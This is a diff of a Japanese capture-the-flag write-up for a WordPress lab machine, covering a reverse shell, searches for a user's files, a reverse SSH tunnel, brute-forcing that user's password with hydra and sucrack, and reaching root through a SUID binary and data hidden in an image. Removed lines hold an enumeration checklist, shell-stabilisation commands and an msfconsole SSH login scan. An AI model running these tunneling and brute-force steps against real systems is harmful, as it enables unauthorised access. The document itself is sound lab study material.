@@ -202,6 +202,8 @@ Twenty Nineteen の 404テンプレートをリバースシェルに書き換え
 
 次にMediaアップロードを試みたが、これも書き込み権限がないため普通のファイルもアップロードできない。
 
+## サブドメイン
+
 phpmyadmin1 の wp_options にサブドメインが入っていた。hostsに追加。
 
 FTPでアップロードしたPHPを実行してリバースシェル取得成功。
@@ -239,6 +241,18 @@ drwxr-xr-x 25 root     root     12288 Dec  8  2020 wp-includes
 
 ## 権限昇格
 
+hakanbey 関連のファイルを検索
+
+```sh
+www-data@ubuntu:/$ ls -Rl / 2>/dev/null | grep hakanbey 
+drwxr-x--- 15 hakanbey hakanbey 4096 Mar 15  2021 hakanbey
+-r-srwx--- 1 root   hakanbey    12984 Jan 14  2021 binary
+-rwxr-x--- 1 root   hakanbey   238080 Nov  5  2017 find
+-rw-r--r-- 1 root root 248 Jan 10  2021 hakanbey
+drwxrwx--- 2 hakanbey lightdm 4096 Jan 10  2021 hakanbey
+-rwxrwxrwx  1 hakanbey hakanbey    38 Jan 14  2021 wwe3bbfla4g.txt
+```
+
 ローカルでリッスンしているのは、22と631ポート。
 
 ```sh
@@ -253,6 +267,31 @@ LISTEN                         0                               32               
 LISTEN                         0                               5                                                                  [::1]:631                                                              [::]:*
 ```
 
+ここで行き詰ったのでウォークスルーを見た。
+
+JPEGとFTPのパスワードが共通の文字列で始まるという類似性に注目する。  
+この法則とワードリストを使い、SSHでブルートフォースを試みる。
+
+SSHは開いていないのでトンネリングする必要がある。
+
+```sh
+www-data@ubuntu:/var/www/html$ ssh tunnel@192.168.129.39 -R 2222:localhost:22 -N
+```
+
+hydraを実行したが、時間がかかりすぎるため断念。
+
+```sh
+$ hydra -l hakanbey -P ./new_wordlist.txt localhost ssh -t 30 -s 2222
+```
+
+sucrack でブルートフォース成功。
+
+```sh
+www-data@ubuntu:/tmp$ dpkg -x ./sucrack.deb sucrack
+www-data@ubuntu:/tmp$ chmod +x ./sucrack/usr/bin/sucrack 
+www-data@ubuntu:/tmp$ ./sucrack/usr/bin/sucrack -w 100 -b 500 -u hakanbey ./new_wordlist.txt
+```
+
 ## 権限昇格２
 
 hakanbeyグループのバイナリが2つあり、binary はSUIDが付いている。
@@ -263,88 +302,34 @@ hakanftp@ubuntu:/$ ls -al /usr/bin | grep hakanbey
 -rwxr-x---  1 root   hakanbey   238080 Nov  5  2017 find
 ```
 
-```sh
-# env_keep+=LD_PRELOAD は見落としがちなので注意
-sudo -l
-```
+ghidraで解析してある文字列を入れたら root.jpg がコピーされた。  
+表示したところルーム画像と同じ。（diffをとったらバイナリレベルでは異なる）
 
 ```sh
-find / -perm -u=s -type f -ls 2>/dev/null
+hakanbey@ubuntu:~$ binary
+I think you should enter the correct string here ==>[REDACTED]
+Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
+
+Copy /root/root.jpg ==> /home/hakanbey/root.jpg
 ```
+
+`From HEX, To Base85` というヒント？？？
+
+hexeditor で画像を開き、`00000020` のアドレスの1行のHEX値をBase85デコードすると、rootの認証情報になった。
 
 ```sh
-find / -user hakanbey -type f -not -path "/proc/*" 2>/dev/null
-find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
+hakanbey@ubuntu:~$ su -
+Password: 
+root@ubuntu:~# 
 ```
-
-```sh
-getcap -r / 2>/dev/null
-ls -al /var/backups
-cat /etc/crontab
-cat /etc/exports
-```
-
-どうしても何も見つからない場合の最後の手段として、linpeasのCVEリストに有効なものがないか確認する。
 
 ## 振り返り
 
-- サブドメインが気づきにくいが、11万件のリストを使ってファジングしていたら早期に気づけていたと思われる。
--
+- サブドメインが気づきにくかったが、11万件のリストを使ってファジングしていたら早期に気づけていたと思われる。
+- hakanbeyの昇格で、定期的に起動されるプロセスは無い、hakanbeyの常駐プロセスも無い、認証情報を入手して昇格するしかない、という予想まではできていたが、パスワードの法則性に気付けなかった。
+- sucrack は知らなかったので勉強になった。
+- debファイルをコピーして展開、実行する操作は参考になる。
 
 ## Tags
 
-#tags: #tags: #tags:
-
-```sh
-# 大分類（Linuxはタグ付けしない）
-Window Kerberos pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM
-
-# 脆弱性の種類
-CVE-xxxx-yyyyy カーネルエクスプロイト
-ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報
-
-# 攻撃の種類
-サービス LFI SSRF XSS SQLインジェクション 競合 フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD セッションID AVバイパス UACバイパス AMSIバイパス PaddingOracles
-
-# ツールなど
-docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle
-```
-
-## メモ
-
-### シェル安定化
-
-```shell
-# python が無くても、python3 でいける場合もある
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-```
-
-### SSH
-
-ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする
-
-```sh
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
-```
-
-エラー
-
-```sh
-# no matching host key type found. Their offer: ssh-rsa,ssh-dss
-# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
--oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
-```
+#tags:sucrack #tags:ステガノグラフィー
